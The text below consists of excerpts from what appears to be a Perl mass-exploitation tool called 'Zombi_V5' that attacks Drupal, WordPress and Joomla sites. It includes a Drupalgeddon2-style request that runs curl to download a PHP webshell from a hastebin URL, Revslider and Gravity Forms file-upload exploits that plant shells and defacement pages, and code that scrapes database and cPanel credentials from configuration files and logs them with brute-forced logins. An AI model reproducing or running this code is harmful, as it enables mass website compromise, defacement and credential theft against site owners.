...
open (TEXT, '>>Zombi_V5/Result-shell.txt');
...
my $addblockurl = "$site/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=mv+sites/default/files/.htaccess+htaccessx;curl+-o+sites/default/files/data-log.php+'https://hastebin.com/raw/haputovika.php'";
my $ajax = "_triggering_element_name";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'user_pass', $ajax => 'name']);
my $body = $response->content;
my $regex='<input type="hidden" name="form_build_id" value="(.*?)" />';
...
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>Zombi_V5/bruteDrup.txt');
...
print "[True Success]\n";
    print color('reset');
    open(save, '>>Zombi_V5/BruteMag.txt');
...
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["ruby.zip"]]);
...
print "[True Success]\n";
    ...
    open(save, '>>Zombi_V5/Result-shell.txt');
...
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
   ...
   print color('bold Blue');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_V5/Result-shell.txt');
...
print color 'reset';                 
        open (TEXT, '>>Zombi_V5/uploaded.txt');
...
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["V5def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "5_hex.php5"]);
...
open(save, '>>Zombi_V5/mh-wiss.txt');
...
my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["V5def.jpg"], form_id => '1', name => 'hex.html', gform_unique_id => '../../../../../', field_id => '3',]);
...
open (TEXT, '>>Zombi_V5/V5index.txt');
...
print color('bold white')," =====HeX=====> ";
print color('bold Blue'),"VULN\n";
     open(save, '>>Zombi_V5/Configrev.txt');   
...
print color('bold white');
print color('reset');
    open(save, '>>Zombi_V5/Try_Manulle.txt');   
...
while($cont =~ m/DB_NAME/g){
	...
	[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_V5/databases.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
...
print color('bold white'),"] ";
        ...
        print color("Yellow"),"\n\t[+]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>Zombi_V5/cpanels.txt');
        print TEXT "\n[ cpanel ] \n$site\n[+]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
...
if($checkajx =~/Hacked|hex|Dr HeX/) {
        ...
        open(save, '>>Zombi_V5/V5index.txt');   
...
my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["tool/root.jpg"], name => "tool/root.html"]
...
if($checkblog =~ m/DB_NAME/g) {
	...
	print color('reset');
open(BEN,">>Zombi_V5/Jom-Config.txt");
...
print "Payload Success: $shellzhex\n";
 open(save, '>>Zombi_V5/V5_12_05_2018_shell.txt');
...
open (TEXT, '>>Zombi_V5/version.txt');
...
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["V5def.jpg"], name => "root.html"]);
if ($exploit->decoded_content =~ /Dr HeX/) {
        open(save, '>>Zombi_V5/V5index.txt');   
    print save "[ads] $site\n";   
    close(save);
...
my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["V5def.jpg"], name => "root.html"]
...
if($hexxy =~/Setup Configuration File/) {
    ...
    open(save, '>>Zombi_V5/wpinstall.txt');
...
print color('bold Blue'),"Done\n";
print color('reset');
open (TEXT, '>>Zombi_V5/joompassword.txt');
...
print color('reset');
open (TEXT, '>>Zombi_V5/BruteOpen.txt');
